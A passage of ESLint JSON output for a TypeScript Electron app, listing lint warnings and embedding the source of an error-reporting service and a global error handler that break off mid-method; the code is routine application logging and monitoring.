you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":504,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":504,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[14550,14553],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[14550,14553],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":511,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":511,"endColumn":20,"suggestions":[{"fix":{"range":[14685,14738],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":521,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":521,"endColumn":16,"suggestions":[{"fix":{"range":[14945,15019],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":532,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":532,"endColumn":22,"suggestions":[{"fix":{"range":[15322,15384],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":539,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":539,"endColumn":16,"suggestions":[{"fix":{"range":[15534,15636],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":24,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Production Error Reporting Service (2025)\n * \n * Comprehensive error reporting system that integrates with existing errorStore\n * and provides offline-first error monitoring with multiple backend support.\n * \n * Following 2025 patterns for resilient error tracking and production monitoring.\n */\n\nimport { useErrorStore, type StoreError } from '@/store/errorStore';\nimport { } from '@/store/backupService';\n\n// Error severity mapping for external services\nexport type ErrorSeverity = 'fatal' | 'error' | 'warning' | 'info' | 'debug';\nexport type ErrorContext = Record<string, any>;\n\n// Configuration for different error reporting backends\nexport interface ErrorReportingConfig {\n  enabled: boolean;\n  dsn?: string; // Sentry DSN or similar\n  environment: string;\n  release?: string;\n  sampleRate: number;\n  maxOfflineItems: number;\n  enableLocalFallback: boolean;\n  enableSessionReplay: boolean;\n  beforeSend?: (errorData: ErrorReportData) => ErrorReportData | null;\n  onError?: (error: Error) => void;\n}\n\n// Standardized error report structure\nexport interface ErrorReportData {\n  id: string;\n  timestamp: Date;\n  message: string;\n  stack?: string;\n  severity: ErrorSeverity;\n  context: ErrorContext;\n  tags: Record<string, string>;\n  user?: {\n    id?: string;\n    email?: string;\n    username?: string;\n  };\n  fingerprint?: string[];\n  breadcrumbs?: Breadcrumb[];\n  extra?: Record<string, any>;\n}\n\n// Breadcrumb tracking for error context\nexport interface Breadcrumb {\n  timestamp: Date;\n  message: string;\n  category: string;\n  level: ErrorSeverity;\n  data?: Record<string, any>;\n}\n\n// Circuit breaker for error reporting to prevent cascading failures\nclass ErrorReportingCircuitBreaker {\n  private failureCount = 0;\n  private lastFailureTime = 0;\n  private isOpen = false;\n  \n  constructor(\n    private readonly threshold = 5,\n    private readonly timeout = 60000 // 1 minute\n  ) {}\n\n  async execute<T>(operation: () => Promise<T>): Promise<T> {\n    if (this.isOpen) {\n      const timeSinceLastFailure = Date.now() - this.lastFailureTime;\n      if (timeSinceLastFailure < this.timeout) {\n        throw new Error('Error reporting circuit breaker is open');\n      }\n      // Half-open state: try to recover\n      this.isOpen = false;\n    }\n\n    try {\n      const result = await operation();\n      this.onSuccess();\n      return result;\n    } catch (error) {\n      this.onFailure();\n      throw error;\n    }\n  }\n\n  private onSuccess(): void {\n    this.failureCount = 0;\n    this.isOpen = false;\n  }\n\n  private onFailure(): void {\n    this.failureCount++;\n    this.lastFailureTime = Date.now();\n    \n    if (this.failureCount >= this.threshold) {\n      this.isOpen = true;\n    }\n  }\n\n  getState() {\n    return {\n      isOpen: this.isOpen,\n      failureCount: this.failureCount,\n      lastFailureTime: this.lastFailureTime\n    };\n  }\n\n  reset(): void {\n    this.failureCount = 0;\n    this.isOpen = false;\n    this.lastFailureTime = 0;\n  }\n}\n\n/**\n * Production Error Reporting Service\n * Integrates with existing errorStore and provides external error monitoring\n */\nexport class ErrorReportingService {\n  private config: ErrorReportingConfig = {\n    enabled: false,\n    environment: 'development',\n    sampleRate: 1.0,\n    maxOfflineItems: 100,\n    enableLocalFallback: true,\n    enableSessionReplay: false\n  };\n\n  private isInitialized = false;\n  private offlineStorage: ErrorReportData[] = [];\n  private breadcrumbs: Breadcrumb[] = [];\n  private circuitBreaker = new ErrorReportingCircuitBreaker();\n  private errorStoreUnsubscribe?: () => void;\n  private sessionId = this.generateSessionId();\n  private userId?: string;\n\n  // Network status tracking\n  private isOnline = navigator.onLine;\n\n  constructor() {\n    this.loadOfflineErrors();\n    this.setupNetworkListeners();\n    this.setupErrorStoreIntegration();\n  }\n\n  /**\n   * Initialize the error reporting service\n   */\n  async initialize(config: Partial<ErrorReportingConfig>): Promise<void> {\n    this.config = { ...this.config, ...config };\n    \n    if (!this.config.enabled) {\n      console.log('Error reporting service disabled');\n      return;\n    }\n\n    try {\n      // Initialize external error monitoring service (e.g., Sentry)\n      if (this.config.dsn && typeof window !== 'undefined') {\n        await this.initializeExternalService();\n      }\n      \n      this.isInitialized = true;\n      this.addBreadcrumb({\n        message: 'Error reporting service initialized',\n        category: 'system',\n        level: 'info',\n        data: {\n          environment: this.config.environment,\n          release: this.config.release,\n          sessionId: this.sessionId\n        }\n      });\n\n      // Sync offline errors if online\n      if (this.isOnline) {\n        await this.syncOfflineErrors();\n      }\n\n      console.log('âœ… Error reporting service initialized successfully');\n    } catch (error) {\n      console.error('âŒ Failed to initialize error reporting service:', error);\n      this.config.onError?.(error instanceof Error ? error : new Error(String(error)));\n    }\n  }\n\n  /**\n   * Report an error to external monitoring service\n   */\n  async reportError(error: Error, options: {\n    severity?: ErrorSeverity;\n    context?: ErrorContext;\n    tags?: Record<string, string>;\n    user?: ErrorReportData['user'];\n    fingerprint?: string[];\n    extra?: Record<string, any>;\n  } = {}): Promise<void> {\n    const errorData = this.createErrorReportData(error, options);\n    \n    // Apply beforeSend filter\n    const filteredData = this.config.beforeSend ? this.config.beforeSend(errorData) : errorData;\n    if (!filteredData) {\n      return; // Error was filtered out\n    }\n\n    // Log in development\n    if (this.config.environment === 'development') {\n      console.group('ðŸ”´ Error Report');\n      console.error('Error:', error);\n      console.log('Report Data:', filteredData);\n      console.log('Breadcrumbs:', this.breadcrumbs.slice(-5));\n      console.groupEnd();\n    }\n\n    // Store offline if not online or not initialized\n    if (!this.isOnline || !this.isInitialized) {\n      this.storeErrorOffline(filteredData);\n      return;\n    }\n\n    try {\n      await this.circuitBreaker.execute(async () => {\n        await this.sendToExternalService(filteredData);\n      });\n    } catch (reportingError) {\n      console.error('Error reporting failed:', reportingError);\n      \n      // Fallback to offline storage\n      if (this.config.enableLocalFallback) {\n        this.storeErrorOffline(filteredData);\n      }\n      \n      this.config.onError?.(reportingError instanceof Error ? reportingError : new Error(String(reportingError)));\n    }\n  }\n\n  /**\n   * Add a breadcrumb for error context\n   */\n  addBreadcrumb(breadcrumb: Omit<Breadcrumb, 'timestamp'>): void {\n    const timestampedBreadcrumb: Breadcrumb = {\n      ...breadcrumb,\n      timestamp: new Date()\n    };\n    \n    this.breadcrumbs.push(timestampedBreadcrumb);\n    \n    // Keep only the last 50 breadcrumbs\n    if (this.breadcrumbs.length > 50) {\n      this.breadcrumbs = this.breadcrumbs.slice(-50);\n    }\n  }\n\n  /**\n   * Set user context for error reporting\n   */\n  setUser(user: ErrorReportData['user']): void {\n    this.userId = user?.id;\n    \n    this.addBreadcrumb({\n      message: 'User context updated',\n      category: 'user',\n      level: 'info',\n      data: { userId: user?.id }\n    });\n  }\n\n  /**\n   * Set custom tags for all future error reports\n   */\n  setTags(tags: Record<string, string>): void {\n    // Store tags in a way that they're included in all future reports\n    this.addBreadcrumb({\n      message: 'Tags updated',\n      category: 'system',\n      level: 'info',\n      data: { tags }\n    });\n  }\n\n  /**\n   * Get current service status\n   */\n  getStatus() {\n    return {\n      isInitialized: this.isInitialized,\n      isOnline: this.isOnline,\n      offlineErrorCount: this.offlineStorage.length,\n      breadcrumbCount: this.breadcrumbs.length,\n      circuitBreakerState: this.circuitBreaker.getState(),\n      sessionId: this.sessionId,\n      userId: this.userId\n    };\n  }\n\n  /**\n   * Export offline errors for debugging\n   */\n  exportOfflineErrors(): ErrorReportData[] {\n    return [...this.offlineStorage];\n  }\n\n  /**\n   * Clear offline error storage\n   */\n  clearOfflineErrors(): void {\n    this.offlineStorage = [];\n    this.saveOfflineErrors();\n  }\n\n  /**\n   * Reset circuit breaker manually\n   */\n  resetCircuitBreaker(): void {\n    this.circuitBreaker.reset();\n  }\n\n  // Private methods\n\n  private async initializeExternalService(): Promise<void> {\n    // This would integrate with Sentry, Bugsnag, or other external services\n    // For now, we'll simulate the initialization\n    if (this.config.dsn) {\n      // await Sentry.init({\n      //   dsn: this.config.dsn,\n      //   environment: this.config.environment,\n      //   release: this.config.release,\n      //   sampleRate: this.config.sampleRate,\n      //   beforeSend: (event) => this.config.beforeSend ? this.config.beforeSend(event) : event\n      // });\n      console.log('ðŸ”„ External error monitoring service initialized');\n    }\n  }\n\n  private async sendToExternalService(errorData: ErrorReportData): Promise<void> {\n    // This would send to Sentry, Bugsnag, or other external services\n    // For now, we'll simulate the API call\n    if (this.config.dsn) {\n      // await Sentry.captureException(new Error(errorData.message), {\n      //   level: errorData.severity,\n      //   tags: errorData.tags,\n      //   user: errorData.user,\n      //   extra: {\n      //     ...errorData.context,\n      //     ...errorData.extra,\n      //     breadcrumbs: this.breadcrumbs.slice(-10)\n      //   },\n      //   fingerprint: errorData.fingerprint\n      // });\n      \n      // Simulate API delay\n      await new Promise(resolve => setTimeout(resolve, Math.random() * 100));\n      console.log('ðŸ“¤ Error sent to external monitoring service:', errorData.id);\n    }\n  }\n\n  private createErrorReportData(error: Error, options: any): ErrorReportData {\n    const severity = options.severity || this.mapErrorToSeverity(error);\n    \n    return {\n      id: this.generateErrorId(),\n      timestamp: new Date(),\n      message: error.message,\n      stack: error.stack,\n      severity,\n      context: {\n        userAgent: navigator.userAgent,\n        url: window.location.href,\n        timestamp: Date.now(),\n        sessionId: this.sessionId,\n        ...options.context\n      },\n      tags: {\n        environment: this.config.environment,\n        release: this.config.release || 'unknown',\n        source: 'renderer',\n        ...options.tags\n      },\n      user: options.user || (this.userId ? { id: this.userId } : undefined),\n      fingerprint: options.fingerprint || [error.name, error.message],\n      breadcrumbs: this.breadcrumbs.slice(-10),\n      extra: options.extra\n    };\n  }\n\n  private mapErrorToSeverity(error: Error): ErrorSeverity {\n    // Map different error types to appropriate severity levels\n    if (error.name === 'ChunkLoadError' || error.message.includes('Loading chunk')) {\n      return 'warning';\n    }\n    if (error.name === 'TypeError' && error.message.includes('Cannot read prop')) {\n      return 'error';\n    }\n    if (error.message.includes('Network Error') || error.message.includes('fetch')) {\n      return 'warning';\n    }\n    return 'error';\n  }\n\n  private setupNetworkListeners(): void {\n    window.addEventListener('online', () => {\n      this.isOnline = true;\n      this.addBreadcrumb({\n        message: 'Network connection restored',\n        category: 'network',\n        level: 'info'\n      });\n      this.syncOfflineErrors();\n    });\n\n    window.addEventListener('offline', () => {\n      this.isOnline = false;\n      this.addBreadcrumb({\n        message: 'Network connection lost',\n        category: 'network',\n        level: 'warning'\n      });\n    });\n  }\n\n  private setupErrorStoreIntegration(): void {\n    // Subscribe to existing errorStore to automatically report errors\n    this.errorStoreUnsubscribe = useErrorStore.subscribe((state) => {\n      const newErrors = state.errors.filter(error => !error.reported);\n      \n      newErrors.forEach(async (storeError) => {\n        // Create Error object from StoreError\n        const error = new Error(storeError.message);\n        error.name = storeError.code;\n        error.stack = storeError.stack;\n\n        await this.reportError(error, {\n          severity: this.mapStoreErrorSeverity(storeError.severity),\n          context: storeError.context,\n          tags: {\n            store: storeError.store,\n            operation: storeError.operation,\n            retryable: storeError.retryable.toString(),\n            recovered: storeError.recovered.toString()\n          },\n          extra: {\n            storeErrorId: storeError.id,\n            errorTimestamp: storeError.timestamp.toISOString()\n          }\n        });\n\n        // Mark as reported in the store\n        useErrorStore.getState().markErrorReported(storeError.id);\n      });\n    });\n  }\n\n  private mapStoreErrorSeverity(severity: StoreError['severity']): ErrorSeverity {\n    const severityMap: Record<StoreError['severity'], ErrorSeverity> = {\n      'low': 'info',\n      'medium': 'warning',\n      'high': 'error',\n      'critical': 'fatal'\n    };\n    return severityMap[severity];\n  }\n\n  private storeErrorOffline(errorData: ErrorReportData): void {\n    this.offlineStorage.push(errorData);\n    \n    // Trim if exceeding max size\n    if (this.offlineStorage.length > this.config.maxOfflineItems) {\n      this.offlineStorage = this.offlineStorage.slice(-this.config.maxOfflineItems);\n    }\n    \n    this.saveOfflineErrors();\n    console.log(`ðŸ’¾ Error stored offline: ${errorData.id} (${this.offlineStorage.length} total)`);\n  }\n\n  private saveOfflineErrors(): void {\n    try {\n      const serializedErrors = this.offlineStorage.map(errorData => ({\n        ...errorData,\n        timestamp: errorData.timestamp.toISOString(),\n        breadcrumbs: errorData.breadcrumbs?.map(b => ({\n          ...b,\n          timestamp: b.timestamp.toISOString()\n        }))\n      }));\n      \n      localStorage.setItem('taskmaster_offline_errors', JSON.stringify(serializedErrors));\n    } catch (err) {\n      console.error('Failed to save offline errors:', err);\n    }\n  }\n\n  private loadOfflineErrors(): void {\n    try {\n      const stored = localStorage.getItem('taskmaster_offline_errors');\n      if (stored) {\n        const parsed = JSON.parse(stored);\n        this.offlineStorage = parsed.map((item: any) => ({\n          ...item,\n          timestamp: new Date(item.timestamp),\n          breadcrumbs: item.breadcrumbs?.map((b: any) => ({\n            ...b,\n            timestamp: new Date(b.timestamp)\n          }))\n        }));\n      }\n    } catch (err) {\n      console.error('Failed to load offline errors:', err);\n      this.offlineStorage = [];\n    }\n  }\n\n  private async syncOfflineErrors(): Promise<void> {\n    if (!this.isOnline || !this.isInitialized || this.offlineStorage.length === 0) {\n      return;\n    }\n\n    console.log(`ðŸ”„ Syncing ${this.offlineStorage.length} offline errors...`);\n    \n    const errorsToSync = [...this.offlineStorage];\n    this.offlineStorage = [];\n    \n    for (const errorData of errorsToSync) {\n      try {\n        await this.circuitBreaker.execute(async () => {\n          await this.sendToExternalService(errorData);\n        });\n      } catch (error) {\n        console.error(`Failed to sync error ${errorData.id}:`, error);\n        // Re-add to offline storage if sync fails\n        this.offlineStorage.push(errorData);\n      }\n    }\n    \n    this.saveOfflineErrors();\n    console.log(`âœ… Offline error sync complete. ${this.offlineStorage.length} errors remaining offline.`);\n  }\n\n  private generateErrorId(): string {\n    return `error_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n  }\n\n  private generateSessionId(): string {\n    return `session_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n  }\n\n  /**\n   * Cleanup method to call when the service is no longer needed\n   */\n  destroy(): void {\n    this.errorStoreUnsubscribe?.();\n    this.saveOfflineErrors();\n  }\n}\n\n// Global instance\nexport const errorReporting = new ErrorReportingService();\n\n// Type is already exported with its declaration","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/services/globalErrorHandler.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":53,"column":57,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":53,"endColumn":60,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1668,1671],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1668,1671],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":54,"column":72,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":54,"endColumn":75,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1744,1747],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1744,1747],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":69,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":69,"endColumn":18,"suggestions":[{"fix":{"range":[2136,2182],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":88,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":88,"endColumn":16,"suggestions":[{"fix":{"range":[2585,2635],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":107,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":107,"endColumn":16,"suggestions":[{"fix":{"range":[3264,3321],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":191,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":191,"endColumn":20,"suggestions":[{"fix":{"range":[5645,5686],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":192,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":192,"endColumn":20,"suggestions":[{"fix":{"range":[5693,5733],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":193,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":193,"endColumn":18,"suggestions":[{"fix":{"range":[5740,5787],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":194,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":194,"endColumn":18,"suggestions":[{"fix":{"range":[5794,5925],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":199,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":199,"endColumn":23,"suggestions":[{"fix":{"range":[5932,5951],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":274,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":274,"endColumn":20,"suggestions":[{"fix":{"range":[8081,8129],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":275,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":275,"endColumn":20,"suggestions":[{"fix":{"range":[8136,8186],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":276,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":276,"endColumn":18,"suggestions":[{"fix":{"range":[8193,8240],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":277,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":277,"endColumn":23,"suggestions":[{"fix":{"range":[8247,8266],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":306,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":306,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9070,9073],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9070,9073],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":306,"column":59,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":306,"endColumn":62,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9093,9096],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9093,9096],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":358,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":358,"endColumn":19,"suggestions":[{"fix":{"range":[10426,10555],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":421,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":421,"endColumn":20,"suggestions":[{"fix":{"range":[12097,12262],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":478,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":478,"endColumn":21,"suggestions":[{"fix":{"range":[13918,13975],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":485,"column":41,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":485,"endColumn":44,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[14120,14123],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[14120,14123],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":604,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":604,"endColumn":19,"suggestions":[{"fix":{"range":[17732,17798],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":702,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":702,"endColumn":16,"suggestions":[{"fix":{"range":[20408,20458],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":22,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Global Error Handler (2025)\n * \n * Comprehensive global error handling for uncaught exceptions, promise rejections,\n * and runtime errors with telemetry integration and graceful degradation.\n * \n * Following 2025 patterns for robust error capture and production monitoring.\n */\n\nimport { errorReporting } from './errorReporting';\nimport { telemetry } from './telemetry';\n\n// Configuration for global error handling\nexport interface GlobalErrorHandlerConfig {\n  enabled: boolean;\n  reportToConsole: boolean;\n  preventDefaultHandling: boolean;\n  enableTelemetryIntegration: boolean;\n  enablePerformanceMonitoring: boolean;\n  errorThreshold: number; // Max errors before disabling handler\n  errorTimeWindow: number; // Time window for error counting (ms)\n  enableUserFeedback: boolean;\n}\n\n// Error classification\ninterface ClassifiedError {\n  category: 'javascript' | 'network' | 'resource' | 'security' | 'performance' | 'unknown';\n  severity: 'low' | 'medium' | 'high' | 'critical';\n  isRecoverable: boolean;\n  shouldReport: boolean;\n  userMessage?: string;\n}\n\n/**\n * Global Error Handler Service\n * Captures and processes all uncaught errors in the application\n */\nexport class GlobalErrorHandler {\n  private config: GlobalErrorHandlerConfig = {\n    enabled: true,\n    reportToConsole: true,\n    preventDefaultHandling: false,\n    enableTelemetryIntegration: true,\n    enablePerformanceMonitoring: true,\n    errorThreshold: 50,\n    errorTimeWindow: 60000, // 1 minute\n    enableUserFeedback: false\n  };\n\n  private isInitialized = false;\n  private errorCount = 0;\n  private errorTimestamps: number[] = [];\n  private originalErrorHandler?: (event: ErrorEvent) => any;\n  private originalRejectionHandler?: (event: PromiseRejectionEvent) => any;\n\n  constructor() {\n    // Store original handlers for cleanup\n    this.originalErrorHandler = window.onerror;\n    this.originalRejectionHandler = window.onunhandledrejection;\n  }\n\n  /**\n   * Initialize global error handling\n   */\n  initialize(config: Partial<GlobalErrorHandlerConfig> = {}): void {\n    this.config = { ...this.config, ...config };\n\n    if (!this.config.enabled) {\n      console.log('Global error handling disabled');\n      return;\n    }\n\n    this.setupGlobalErrorHandlers();\n    this.setupPerformanceMonitoring();\n    this.isInitialized = true;\n\n    // Track initialization\n    if (this.config.enableTelemetryIntegration) {\n      telemetry.trackEvent({\n        name: 'global_error_handler_initialized',\n        properties: {\n          config: this.config,\n          timestamp: Date.now()\n        }\n      });\n    }\n\n    console.log('âœ… Global error handler initialized');\n  }\n\n  /**\n   * Setup global error event listeners\n   */\n  private setupGlobalErrorHandlers(): void {\n    // Handle JavaScript errors\n    window.addEventListener('error', this.handleGlobalError.bind(this), true);\n\n    // Handle unhandled promise rejections\n    window.addEventListener('unhandledrejection', this.handleUnhandledRejection.bind(this), true);\n\n    // Handle resource loading errors\n    window.addEventListener('error', this.handleResourceError.bind(this), true);\n\n    // Handle security policy violations (CSP)\n    document.addEventListener('securitypolicyviolation', this.handleSecurityViolation.bind(this));\n\n    console.log('ðŸ›¡ï¸ Global error event listeners attached');\n  }\n\n  /**\n   * Handle uncaught JavaScript errors\n   */\n  private handleGlobalError(event: ErrorEvent): void {\n    if (!this.shouldHandleError()) return;\n\n    const error = event.error || new Error(event.message);\n    const classification = this.classifyError(error, 'javascript');\n\n    // Add error context\n    errorReporting.addBreadcrumb({\n      message: 'Global JavaScript error occurred',\n      category: 'error',\n      level: classification.severity === 'critical' ? 'error' : 'warning',\n      data: {\n        filename: event.filename,\n        lineno: event.lineno,\n        colno: event.colno,\n        message: event.message\n      }\n    });\n\n    // Report the error\n    if (classification.shouldReport) {\n      errorReporting.reportError(error, {\n        severity: this.mapSeverityToErrorSeverity(classification.severity),\n        context: {\n          filename: event.filename,\n          lineno: event.lineno,\n          colno: event.colno,\n          userAgent: navigator.userAgent,\n          url: window.location.href,\n          timestamp: Date.now(),\n          classification\n        },\n        tags: {\n          source: 'global',\n          type: 'uncaught_exception',\n          category: classification.category,\n          recoverable: classification.isRecoverable.toString()\n        },\n        extra: {\n          errorEvent: {\n            filename: event.filename,\n            lineno: event.lineno,\n            colno: event.colno,\n            message: event.message\n          }\n        }\n      });\n    }\n\n    // Track telemetry\n    if (this.config.enableTelemetryIntegration) {\n      telemetry.trackEvent({\n        name: 'uncaught_error',\n        properties: {\n          errorName: error.name,\n          errorMessage: error.message,\n          filename: event.filename,\n          line: event.lineno,\n          column: event.colno,\n          category: classification.category,\n          severity: classification.severity,\n          recoverable: classification.isRecoverable\n        }\n      });\n\n      telemetry.trackPerformance({\n        name: 'error_handling_time',\n        value: Date.now(),\n        unit: 'ms',\n        tags: {\n          type: 'global_error',\n          category: classification.category\n        }\n      });\n    }\n\n    // Console logging in development\n    if (this.config.reportToConsole) {\n      console.group('ðŸ”´ Global Error Handler');\n      console.error('Uncaught error:', error);\n      console.log('Classification:', classification);\n      console.log('Event details:', {\n        filename: event.filename,\n        line: event.lineno,\n        column: event.colno\n      });\n      console.groupEnd();\n    }\n\n    // Show user feedback if enabled and error is severe\n    if (this.config.enableUserFeedback && classification.severity === 'critical' && classification.userMessage) {\n      this.showUserErrorFeedback(classification.userMessage);\n    }\n\n    // Prevent default handling if configured\n    if (this.config.preventDefaultHandling) {\n      event.preventDefault();\n    }\n\n    this.incrementErrorCount();\n  }\n\n  /**\n   * Handle unhandled promise rejections\n   */\n  private handleUnhandledRejection(event: PromiseRejectionEvent): void {\n    if (!this.shouldHandleError()) return;\n\n    const error = event.reason instanceof Error \n      ? event.reason \n      : new Error(String(event.reason));\n    \n    const classification = this.classifyError(error, 'javascript');\n\n    // Add breadcrumb\n    errorReporting.addBreadcrumb({\n      message: 'Unhandled promise rejection',\n      category: 'promise',\n      level: classification.severity === 'critical' ? 'error' : 'warning',\n      data: {\n        reason: String(event.reason),\n        promiseRejection: true\n      }\n    });\n\n    // Report the error\n    if (classification.shouldReport) {\n      errorReporting.reportError(error, {\n        severity: this.mapSeverityToErrorSeverity(classification.severity),\n        context: {\n          reason: String(event.reason),\n          promiseRejection: true,\n          url: window.location.href,\n          timestamp: Date.now(),\n          classification\n        },\n        tags: {\n          source: 'global',\n          type: 'unhandled_rejection',\n          category: classification.category,\n          recoverable: classification.isRecoverable.toString()\n        }\n      });\n    }\n\n    // Track telemetry\n    if (this.config.enableTelemetryIntegration) {\n      telemetry.trackEvent({\n        name: 'unhandled_rejection',\n        properties: {\n          errorName: error.name,\n          errorMessage: error.message,\n          reason: String(event.reason),\n          category: classification.category,\n          severity: classification.severity\n        }\n      });\n    }\n\n    // Console logging\n    if (this.config.reportToConsole) {\n      